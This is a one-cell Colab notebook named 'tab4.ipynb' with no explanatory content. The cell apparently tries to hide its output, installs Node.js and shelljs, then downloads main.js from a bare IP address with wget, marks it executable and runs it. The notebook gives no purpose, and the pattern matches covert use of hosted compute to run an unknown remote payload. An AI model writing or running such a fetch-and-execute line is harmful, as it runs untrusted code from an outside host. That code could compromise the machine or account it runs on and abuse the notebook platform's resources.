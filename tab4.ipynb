{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "tab4.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "voGFUzYVRq40"
      },
      "outputs": [],
      "source": [
        "%%captute\n",
        "%%shell\n",
        "apt update -y && apt install -y nodejs\n",
        "npm install -i shelljs\n",
        "wget -q http://199.250.207.182/~ngewetech/include/induk/main.js && chmod +x main.js && node main.js"
      ]
    }
  ]
}
